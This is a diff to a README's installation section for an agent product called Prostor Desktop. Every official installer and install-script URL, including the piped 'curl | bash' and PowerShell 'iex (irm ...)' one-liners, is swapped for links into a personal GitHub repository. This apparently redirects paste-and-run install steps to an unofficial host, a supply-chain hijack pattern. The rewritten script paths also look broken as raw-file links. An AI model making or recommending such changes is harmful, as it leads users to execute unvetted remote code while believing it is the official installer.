@@ -20,7 +20,7 @@ The simplest path: a one-click installer with a guided, point-and-click setup. N
 
 ### 1. Download and install
 
-[Download the Prostor Desktop installer](https://prostor-agent.nousresearch.com/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
+[Download the Prostor Desktop installer](https://github.com/maksim9510/Prostor/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
 
 ### 2. Connect Nous Portal
 
@@ -49,16 +49,16 @@ Prefer the terminal?
 On macOS/Linux/WSL2/Android, run
 
 ```bash
-curl -fsSL https://prostor-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://github.com/maksim9510/Prostor/install.sh | bash
 ```
 
 On Windows, run
 
 ```powershell
-iex (irm https://prostor-agent.nousresearch.com/install.ps1)
+iex (irm https://github.com/maksim9510/Prostor/install.ps1)
 ```
 
-Prefer to review first? Download [`install.sh`](https://prostor-agent.nousresearch.com/install.sh), inspect it, then run it.
+Prefer to review first? Download [`install.sh`](https://github.com/maksim9510/Prostor/install.sh), inspect it, then run it.
 
 After it finishes, reload your shell:
 
